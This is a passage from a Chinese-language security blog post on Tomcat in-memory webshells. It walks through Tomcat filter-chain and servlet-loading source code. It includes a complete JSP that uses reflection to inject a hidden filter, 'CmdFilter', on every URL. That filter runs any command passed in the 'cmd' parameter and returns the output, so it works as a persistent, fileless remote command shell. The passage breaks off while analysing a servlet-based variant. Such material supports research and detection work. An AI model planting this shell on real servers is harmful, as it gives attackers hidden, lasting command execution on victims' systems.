class="keyword">throw</span> (IOException) e;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RuntimeException)</span><br><span class="line">                    <span class="keyword">throw</span> (RuntimeException) e;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(e.getMessage(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            internalDoFilter(request,response); <span class="comment">// ==&gt; 调用internalDoFilter函数()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ApplicationFilterChain</span> <span class="keyword">implements</span> <span class="title class_">FilterChain</span> &#123;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">                                  ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123; <span class="comment">// ==&gt; 遍历FilterChains</span></span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> filters[pos++];</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> filterConfig.getFilter(); <span class="comment">// ==&gt; 获取对应的Filter</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="string">&quot;false&quot;</span>.equalsIgnoreCase(</span><br><span class="line">                        filterConfig.getFilterDef().getAsyncSupported())) &#123;</span><br><span class="line">                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">                    <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span></span><br><span class="line">                        ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line"></span><br><span class="line">                    Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;req, res, <span class="built_in">this</span>&#125;;</span><br><span class="line">                    SecurityUtil.doAsPrivilege (<span class="string">&quot;doFilter&quot;</span>, filter, classType, args, principal);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filter.doFilter(request, response, <span class="built_in">this</span>); <span class="comment">// ==&gt; 调用对应的doFilter()函数</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException | ServletException | RuntimeException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                e = ExceptionUtils.unwrapInvocationTargetException(e);</span><br><span class="line">                ExceptionUtils.handleThrowable(e);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(sm.getString(<span class="string">&quot;filterChain.filter&quot;</span>), e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">                lastServicedRequest.set(request);</span><br><span class="line">                lastServicedResponse.set(response);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !servletSupportsAsync) &#123;</span><br><span class="line">                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR,</span><br><span class="line">                        Boolean.FALSE);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((request <span class="keyword">instanceof</span> HttpServletRequest) &amp;&amp;</span><br><span class="line">                    (response <span class="keyword">instanceof</span> HttpServletResponse) &amp;&amp;</span><br><span class="line">                    Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">                <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span></span><br><span class="line">                    ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line">                Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;req, res&#125;;</span><br><span class="line">                SecurityUtil.doAsPrivilege(<span class="string">&quot;service&quot;</span>,</span><br><span class="line">                                           servlet,</span><br><span class="line">                                           classTypeUsedInService,</span><br><span class="line">                                           args,</span><br><span class="line">                                           principal);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                servlet.service(request, response); <span class="comment">// ==&gt; FilterChain结束后调用对应的Servlet</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结</strong></p>
<p>想要注入一个<code>filter</code>内存马，核心在篡改<code>StandardContext</code>中的<code>filterMaps</code>属性来绕过<code>dispatcher</code>和<code>requestPath</code>，然后把<code>filterConfig</code>注入到<code>StandardContext</code>的<code>filterConfigs</code>属性中即可</p>
<p><code>filterMaps</code>需要包含对应的<code>dispatcherMapping</code>、<code>filterName</code>和<code>urlPatterns</code></p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419024dcd9d08efa3dfd40056.png" alt="image-20211202012812870" style="zoom:80%;" />

<p><code>filterConfig</code>中的<code>filterDef</code>需要包含对应的<code>filter</code>、<code>filterClass</code>和<code>filterName</code></p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419024dcd9d08efa3dfd40056.png" alt="image-20211202012939483" style="zoom:80%;" />

<h4 id="Filter内存马实例"><a href="#Filter内存马实例" class="headerlink" title="Filter内存马实例"></a>Filter内存马实例</h4><blockquote>
<p>一定要先修改filterDef，再修改filterMap，不然会抛出找不到filterName的异常</p>
</blockquote>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;AddFilter&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    Map filterConfigs;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 从ServletContext中反射获取ApplicationContext和StandardContext</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取filterConfigs</span></span><br><span class="line">        Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">FilterName</span> <span class="operator">=</span> <span class="string">&quot;CmdFilter&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (filterConfigs.get(FilterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                    <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                    <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">                        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                        servletResponse.getWriter().write(output);</span><br><span class="line">                        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                        out.println(output);</span><br><span class="line">                        out.flush();</span><br><span class="line">                        out.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取FilterDef并修改其filter、filterName和filterClass</span></span><br><span class="line">            Class&lt;?&gt; FilterDef = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">declaredConstructor1</span> <span class="operator">=</span> FilterDef.getDeclaredConstructor();</span><br><span class="line">            org.apache.tomcat.util.descriptor.web.<span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> (FilterDef) declaredConstructor1.newInstance();</span><br><span class="line">            filterDef.setFilter(filter);</span><br><span class="line">            filterDef.setFilterName(FilterName);</span><br><span class="line">            filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">            <span class="comment">// 加入到StandardContext的FilterDef属性中</span></span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取FilterMap并修改其URLPattern、FilterName和Dispatcher</span></span><br><span class="line">            Class&lt;?&gt; FilterMap = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();</span><br><span class="line">            org.apache.tomcat.util.descriptor.web.<span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> (FilterMap) declaredConstructor.newInstance();</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">            filterMap.setFilterName(FilterName);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">            <span class="comment">// 加入到StandardContext的filterMaps属性中</span></span><br><span class="line">            standardContext.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取ApplicationFilterConfig，注入filterDef</span></span><br><span class="line">            Class&lt;?&gt; ApplicationFilterConfig = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; declaredConstructor2 = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            declaredConstructor2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            org.apache.catalina.core.<span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) declaredConstructor2.newInstance(standardContext, filterDef);</span><br><span class="line">            filterConfigs.put(FilterName, filterConfig);</span><br><span class="line"></span><br><span class="line">            response.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h3><h4 id="loadOnStartup"><a href="#loadOnStartup" class="headerlink" title="loadOnStartup"></a>loadOnStartup</h4><p>在<code>StanderContext</code>的初始化过程中，在配置完<code>filter</code>之后就会调用<code>loadOnStartup()</code>方法来初始化<code>servlet</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StandardContext</span> <span class="keyword">extends</span> <span class="title class_">ContainerBase</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Context</span>, NotificationEmitter &#123;</span><br><span class="line">        </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">startInternal</span><span class="params">()</span> <span class="keyword">throws</span> LifecycleException &#123;</span><br><span class="line">    	...</span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!filterStart()) &#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.filterFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!loadOnStartup(findChildren()))&#123; <span class="comment">// ==&gt; findChildren()返回所有Servlet</span></span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.servletFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">      	...</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ContainerBase</span> <span class="keyword">extends</span> <span class="title class_">LifecycleMBeanBase</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Container</span> &#123;</span><br><span class="line">        </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Container[] findChildren() &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (children) &#123; <span class="comment">// ==&gt; Children是一个HashMap类型，存储着各个StandardWrapper</span></span><br><span class="line">            Container results[] = <span class="keyword">new</span> <span class="title class_">Container</span>[children.size()];</span><br><span class="line">            <span class="keyword">return</span> children.values().toArray(results); <span class="comment">// ==&gt; 将Wrapper转化为Container</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419020d0e5454e24738554553.png" alt="image-20211202123329058" style="zoom:80%;" />


<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StandardContext</span> <span class="keyword">extends</span> <span class="title class_">ContainerBase</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Context</span>, NotificationEmitter &#123;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;</span><br><span class="line"></span><br><span class="line">        TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child; <span class="comment">// ==&gt; 将Container转化为Wrapper（略显多余的一个步骤）</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();</span><br><span class="line">            <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123; <span class="comment">// 令loadOnStartup大于0</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);</span><br><span class="line">            ArrayList&lt;Wrapper&gt; list = map.get(key);</span><br><span class="line">            <span class="keyword">if</span> (list == <span class="literal">null</span>) &#123;</span><br><span class="line">                list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                map.put(key, list);</span><br><span class="line">            &#125;</span><br><span class="line">            list.add(wrapper); <span class="comment">// ==&gt; 将wrapper装入list中</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Load the collected &quot;load on startup&quot; servlets</span></span><br><span class="line">        <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    wrapper.load(); <span class="comment">// 加载list中的Servlet</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line">                    getLogger().error(sm.getString(<span class="string">&quot;standardContext.loadOnStartup.loadException&quot;</span>,</span><br><span class="line">                          getName(), wrapper.getName()), StandardWrapper.getRootCause(e));</span><br><span class="line">                    <span class="keyword">if</span>(getComputedFailCtxIfServletStartFails()) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以这里的重点是修改<code>children</code>属性加入我们的<code>wrapper</code>，向上追溯如何生成<code>children</code>，我们可以来到解析<code>web.xml</code>的函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.startup;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ContextConfig</span> <span class="keyword">implements</span> <span class="title class_">LifecycleListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">configureContext</span><span class="params">(WebXml webxml)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123; <span class="comment">// 搜索web.xml中的servlet</span></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper(); <span class="comment">// 生成新的wrapper</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue()); <span class="comment">// 设置loadOnStartup</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setName(servlet.getServletName()); <span class="comment">// 设置servletName</span></span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">            <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">maxFileSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="type">long</span> <span class="variable">maxRequestSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">fileSizeThreshold</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxFileSize()) &#123;</span><br><span class="line">                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxRequestSize()) &#123;</span><br><span class="line">                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;</span><br><span class="line">                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">                        multipartdef.getLocation(),</span><br><span class="line">                        maxFileSize,</span><br><span class="line">                        maxRequestSize,</span><br><span class="line">                        fileSizeThreshold));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setAsyncSupported(</span><br><span class="line">                        servlet.getAsyncSupported().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">            context.addChild(wrapper); <span class="comment">// ==&gt; 向context新的Child</span></span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p><code>addChild()</code>方法会调用父类的<code>addChildInternal()</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina.core;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ContainerBase</span> <span class="keyword">extends</span> <span class="title class_">LifecycleMBeanBase</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Container</span> &#123;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addChildInternal</span><span class="params">(Container child)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( log.isDebugEnabled() )</span><br><span class="line">            log.debug(<span class="string">&quot;Add child &quot;</span> + child + <span class="string">&quot; &quot;</span> + <span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">synchronized</span>(children) &#123;</span><br><span class="line">            <span class="keyword">if</span> (children.get(child.getName()) != <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;addChild:  Child name &#x27;&quot;</span> +</span><br><span class="line">                                                   child.getName() +</span><br><span class="line">                                                   <span class="string">&quot;&#x27; is not unique&quot;</span>);</span><br><span class="line">            child.setParent(<span class="built_in">this</span>);</span><br><span class="line">            children.put(child.getName(), child); <span class="comment">// 向children属性添加新的wrapper</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((getState().isAvailable() ||</span><br><span class="line">                    LifecycleState.STARTING_PREP.equals(getState())) &amp;&amp;</span><br><span class="line">                    startChildren) &#123;</span><br><span class="line">                child.start();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LifecycleException e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;ContainerBase.addChild: start: &quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;ContainerBase.addChild: start: &quot;</span> + e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            fireContainerEvent(ADD_CHILD_EVENT, child);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>同时需要注意在解析<code>web.xml</code>时，还会将解析到<code>WebServlet</code>添加到<code>context</code>的<code>servletMappingNames</code>属性中，来添加<code>URL</code>匹配规则</p>
